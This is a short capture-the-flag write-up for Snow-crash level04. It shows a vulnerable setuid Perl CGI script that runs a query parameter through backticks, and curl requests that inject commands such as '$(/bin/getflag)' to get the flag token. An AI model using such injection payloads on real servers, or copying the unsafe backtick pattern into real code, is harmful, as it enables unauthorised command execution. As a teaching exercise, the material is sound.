# Snow-crash - level04


* Perl file found, after cat an url commment in script is present
```console
~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
~$ cat ./level04.pl
```
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

* Try to curl it ! And with `x` var query as shown above on the script
```console
~$ curl -v localhost:4747
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET / HTTP/1.1
> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: localhost:4747
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 29 Oct 2022 06:29:09 GMT
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 1
< Content-Type: text/html
< 
...
~$ curl  localhost:4747?x="test"
test
```

* Injection of getflag command in script perl
```console
~$ curl localhost:4747?x="\`/bin/getflag\`"
~$ curl -v 192.168.56.4:4747?x='$(/bin/getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```